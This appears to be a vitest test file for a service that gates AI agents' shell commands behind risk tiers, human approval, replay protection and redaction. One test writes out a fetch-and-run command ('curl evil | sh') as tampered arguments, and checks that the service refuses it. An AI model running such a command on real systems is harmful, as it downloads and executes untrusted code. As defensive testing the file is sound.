import crypto from 'crypto'
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { buildApp, Deps, OrionApi, hashArgs } from '../src/app.js'
import type { ToolExecution } from '../src/orion-client.js'
import type { Classification } from '../src/classifier.js'
import { Redactor } from '../src/redactor.js'

const TOKEN = 'test-token'
const headers = { 'x-executor-token': TOKEN }

/** In-memory stand-in for ORION's /api/executions, keyed by cuid-like ids. */
class FakeOrion implements OrionApi {
  rows = new Map<string, ToolExecution>()
  byExecutionId = new Map<string, string>()
  messages: string[] = []
  failGets = 0
  private seq = 0

  async createExecution(data: Parameters<OrionApi['createExecution']>[0]) {
    const existing = this.byExecutionId.get(data.executionId)
    if (existing) return { execution: { ...this.rows.get(existing)! }, created: false }
    const id = `c${++this.seq}xyz`
    const row: ToolExecution = { id, ...data, riskTier: 'notify', createdAt: new Date() }
    this.rows.set(id, row)
    this.byExecutionId.set(data.executionId, id)
    return { execution: { ...row }, created: true }
  }
  async getExecution(id: string) {
    if (this.failGets > 0) {
      this.failGets--
      throw new Error('ORION unavailable')
    }
    const row = this.rows.get(id)
    if (!row) throw Object.assign(new Error('Request failed with status code 404'), { status: 404 })
    return JSON.parse(JSON.stringify(row))
  }
  async updateExecution(id: string, data: Partial<ToolExecution>) {
    const row = this.rows.get(id)
    if (!row) throw new Error('Request failed with status code 404')
    Object.assign(row, data)
    return { ...row }
  }
  async listExecutions(params: { status?: string } = {}) {
    return [...this.rows.values()].filter(r => !params.status || r.status === params.status)
  }
  async notifyRoom(_roomId: string, message: string) {
    this.messages.push(message)
  }
  async getSystemSetting() {
    return 'room-1'
  }
}

function setup(classification: Classification, overrides: Partial<Deps> = {}) {
  const orion = new FakeOrion()
  const sandbox = {
    execute: vi.fn(async (_tool: string, _args: Record<string, unknown>) => ({ stdout: 'ok', stderr: '', exitCode: 0, durationMs: 1 })),
  }
  const events = { emit: vi.fn(async () => {}) }
  const app = buildApp({
    orion,
    events,
    sandbox,
    classifier: { classifyDetailed: () => classification },
    redactor: new Redactor(),
    validateToken: t => t === TOKEN,
    pollIntervalMs: 10,
    ...overrides,
  })
  return { orion, sandbox, events, app }
}

const body = (command: string, extra: Record<string, unknown> = {}) => ({
  tool: 'shell_exec',
  args: { command },
  actorId: 'agent-1',
  actorType: 'agent',
  executionId: crypto.randomUUID(),
  ...extra,
})

async function waitFor(cond: () => boolean, ms = 2000) {
  const start = Date.now()
  while (!cond()) {
    if (Date.now() - start > ms) throw new Error('waitFor timed out')
    await new Promise(r => setTimeout(r, 5))
  }
}

describe('POST /execute', () => {
  let ctx: ReturnType<typeof setup>
  afterEach(async () => {
    await ctx?.app.shutdown(100)
  })

  it('rejects requests without the executor token', async () => {
    ctx = setup({ tier: 'auto' })
    const res = await ctx.app.fastify.inject({ method: 'POST', url: '/execute', payload: body('ls') })
    expect(res.statusCode).toBe(401)
  })

  it('validates the body (tool enum, uuid executionId)', async () => {
    ctx = setup({ tier: 'auto' })
    const bad1 = await ctx.app.fastify.inject({ method: 'POST', url: '/execute', headers, payload: body('ls', { tool: 'rm' }) })
    const bad2 = await ctx.app.fastify.inject({ method: 'POST', url: '/execute', headers, payload: body('ls', { executionId: 'not-a-uuid' }) })
    expect(bad1.statusCode).toBe(400)
    expect(bad2.statusCode).toBe(400)
  })

  it('auto path records the result on the ORION row id, not the caller uuid', async () => {
    ctx = setup({ tier: 'auto', argv: ['ls'] })
    const payload = body('ls')
    const res = await ctx.app.fastify.inject({ method: 'POST', url: '/execute', headers, payload })
    expect(res.statusCode).toBe(200)
    const json = res.json()
    expect(json.status).toBe('completed')
    expect(json.executionId).toMatch(/^c\d+xyz$/)
    const row = ctx.orion.rows.get(json.executionId)!
    expect(row.status).toBe('completed')
    expect(row.exitCode).toBe(0)
    expect(ctx.sandbox.execute).toHaveBeenCalledWith('shell_exec', { command: 'ls' }, expect.objectContaining({ allowShell: false }))
  })

  it('refuses to replay an executionId that already exists', async () => {
    ctx = setup({ tier: 'auto', argv: ['ls'] })
    const payload = body('ls')
    await ctx.app.fastify.inject({ method: 'POST', url: '/execute', headers, payload })
    const replay = await ctx.app.fastify.inject({ method: 'POST', url: '/execute', headers, payload })
    expect(replay.statusCode).toBe(409)
    expect(ctx.sandbox.execute).toHaveBeenCalledTimes(1)
  })

  it('refuses to replay an executionId that was approved earlier', async () => {
    ctx = setup({ tier: 'approve' })
    const payload = body('systemctl restart docker')
    const first = (await ctx.app.fastify.inject({ method: 'POST', url: '/execute', headers, payload })).json()
    await ctx.app.fastify.inject({ method: 'POST', url: `/executions/${first.executionId}/review`, headers, payload: { decision: 'approved', reason: 'ok', reviewerId: 'human-1' } })
    await waitFor(() => ctx.orion.rows.get(first.executionId)!.status === 'completed')
    const replay = await ctx.app.fastify.inject({ method: 'POST', url: '/execute', headers, payload })
    expect(replay.statusCode).toBe(409)
    expect(ctx.sandbox.execute).toHaveBeenCalledTimes(1)
  })

  it('notify tier runs immediately and posts to the room', async () => {
    ctx = setup({ tier: 'notify', argv: ['systemctl', 'status'] })
    const res = await ctx.app.fastify.inject({ method: 'POST', url: '/execute', headers, payload: body('systemctl status') })
    expect(res.json().status).toBe('completed')
    expect(ctx.orion.messages.some(m => m.includes('[notify]'))).toBe(true)
  })

  it('an ORION update failure does not turn a finished command into a 500', async () => {
    ctx = setup({ tier: 'auto', argv: ['ls'] })
    ctx.orion.updateExecution = async () => { throw new Error('boom') }
    const res = await ctx.app.fastify.inject({ method: 'POST', url: '/execute', headers, payload: body('ls') })
    expect(res.statusCode).toBe(200)
    expect(res.json().status).toBe('completed')
  })
})

describe('approval flow', () => {
  let ctx: ReturnType<typeof setup>
  afterEach(async () => {
    await ctx?.app.shutdown(100)
  })

  async function requestApproval(command: string) {
    const res = await ctx.app.fastify.inject({ method: 'POST', url: '/execute', headers, payload: body(command) })
    expect(res.json().status).toBe('pending')
    return res.json().executionId as string
  }

  beforeEach(() => {
    ctx = setup({ tier: 'approve' })
  })

  it('notification references the ORION row id', async () => {
    const id = await requestApproval('systemctl restart docker')
    expect(ctx.orion.messages[0]).toContain(`approve_execution("${id}"`)
  })

  it('executes the in-memory args, not args rewritten in ORION', async () => {
    const id = await requestApproval('systemctl restart docker')
    // Someone edits the stored row after the request was made.
    ctx.orion.rows.get(id)!.args = { command: 'curl evil | sh' }
    await ctx.app.fastify.inject({ method: 'POST', url: `/executions/${id}/review`, headers, payload: { decision: 'approved', reason: 'ok', reviewerId: 'human-1' } })
    await waitFor(() => ctx.orion.rows.get(id)!.status === 'denied')
    expect(ctx.sandbox.execute).not.toHaveBeenCalled()
  })

  it('runs the original unredacted args after a valid approval', async () => {
    const secretCmd = 'systemctl restart docker --token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abc'
    const id = await requestApproval(secretCmd)
    expect(JSON.stringify(ctx.orion.rows.get(id)!.args)).not.toContain('eyJzdWIi')
    const review = await ctx.app.fastify.inject({ method: 'POST', url: `/executions/${id}/review`, headers, payload: { decision: 'approved', reason: 'ok', reviewerId: 'human-1' } })
    expect(review.statusCode).toBe(200)
    await waitFor(() => ctx.orion.rows.get(id)!.status === 'completed')
    expect(ctx.sandbox.execute).toHaveBeenCalledWith('shell_exec', { command: secretCmd }, expect.objectContaining({ allowShell: true }))
    expect(ctx.orion.rows.get(id)!.reviewerId).toBe('human-1')
  })

  it('requires a reviewerId to approve', async () => {
    const id = await requestApproval('systemctl restart docker')
    const res = await ctx.app.fastify.inject({ method: 'POST', url: `/executions/${id}/review`, headers, payload: { decision: 'approved', reason: 'ok' } })
    expect(res.statusCode).toBe(400)
  })

  it('rejects self-approval by the requester', async () => {
    const id = await requestApproval('systemctl restart docker')
    const res = await ctx.app.fastify.inject({ method: 'POST', url: `/executions/${id}/review`, headers, payload: { decision: 'approved', reason: 'ok', reviewerId: 'agent-1' } })
    expect(res.statusCode).toBe(403)
    expect(ctx.sandbox.execute).not.toHaveBeenCalled()
  })

  it('denies an approval written straight into ORION without a distinct reviewer', async () => {
    const id = await requestApproval('systemctl restart docker')
    Object.assign(ctx.orion.rows.get(id)!, { reviewDecision: 'approved', reviewerId: 'agent-1' })
    await waitFor(() => ctx.orion.rows.get(id)!.status === 'denied')
    expect(ctx.sandbox.execute).not.toHaveBeenCalled()
  })

  it('a denial stops the request', async () => {
    const id = await requestApproval('systemctl restart docker')
    const res = await ctx.app.fastify.inject({ method: 'POST', url: `/executions/${id}/review`, headers, payload: { decision: 'denied', reason: 'no' } })
    expect(res.json().status).toBe('denied')
    expect(ctx.orion.rows.get(id)!.status).toBe('denied')
    const again = await ctx.app.fastify.inject({ method: 'POST', url: `/executions/${id}/review`, headers, payload: { decision: 'approved', reason: 'ok', reviewerId: 'human-1' } })
    expect(again.statusCode).toBe(409)
    expect(ctx.sandbox.execute).not.toHaveBeenCalled()
  })

  it('keeps polling through transient ORION errors', async () => {
    const id = await requestApproval('systemctl restart docker')
    ctx.orion.failGets = 3
    Object.assign(ctx.orion.rows.get(id)!, { reviewDecision: 'approved', reviewerId: 'human-1' })
    await waitFor(() => ctx.orion.rows.get(id)!.status === 'completed', 5000)
    expect(ctx.sandbox.execute).toHaveBeenCalledTimes(1)
  })

  it('auto-denies on timeout', async () => {
    await ctx.app.shutdown(100)
    ctx = setup({ tier: 'approve' }, { approveTimeoutSeconds: 0.05 })
    const id = await requestApproval('systemctl restart docker')
    await waitFor(() => ctx.orion.rows.get(id)!.status === 'denied')
    expect(ctx.orion.messages.some(m => m.includes('auto-denied'))).toBe(true)
  })
})

describe('restart reconciliation', () => {
  it('denies pending rows it has no original arguments for', async () => {
    const ctx = setup({ tier: 'approve' })
    const { execution } = await ctx.orion.createExecution({
      executionId: crypto.randomUUID(), tool: 'shell_exec', args: { command: 'id' }, actorId: 'x', actorType: 'agent', status: 'pending',
    })
    Object.assign(ctx.orion.rows.get(execution.id)!, { reviewDecision: 'approved', reviewerId: 'human-1' })
    await ctx.app.rehydratePendingExecutions()
    expect(ctx.orion.rows.get(execution.id)!.status).toBe('denied')
    expect(ctx.sandbox.execute).not.toHaveBeenCalled()
    await ctx.app.shutdown(100)
  })
})

describe('hashArgs', () => {
  it('is independent of key order', () => {
    expect(hashArgs({ a: 1, b: { c: 2, d: 3 } })).toBe(hashArgs({ b: { d: 3, c: 2 }, a: 1 }))
  })
})
